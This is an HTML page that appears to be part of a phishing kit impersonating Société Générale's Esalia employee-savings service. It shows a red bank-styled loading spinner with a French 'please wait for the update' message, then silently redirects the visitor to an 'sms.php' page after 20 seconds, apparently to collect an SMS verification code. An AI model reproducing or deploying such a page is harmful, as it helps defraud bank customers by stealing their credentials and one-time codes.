<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="refresh" content="20;URL='./sms.php'" />  
  <title>Epargne salariale,participation-Société Générale,Esalia</title>
  <style>
    body {
      background-color: #ffffff;
    }

    .spinner-container {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      text-align: center;
    }

    .spinner {
      width: 80px;
      height: 80px;
      border: 10px solid rgba(0, 0, 0, 0.1);
      border-top-color: #ed1a3a;
      border-radius: 50%;
      animation: spin 1s infinite linear;
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }
      100% {
        transform: rotate(360deg);
      }
    }

    .loading-text {
      margin-top: 20px;
      font-size: 20px;
      color: #333333;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="spinner-container">
  <center>
    <div class="spinner"></div>
	  </center>

    <p class="loading-text">Veuillez patienter pour la mise à jour...</p>
  </div>
</body>
</html>

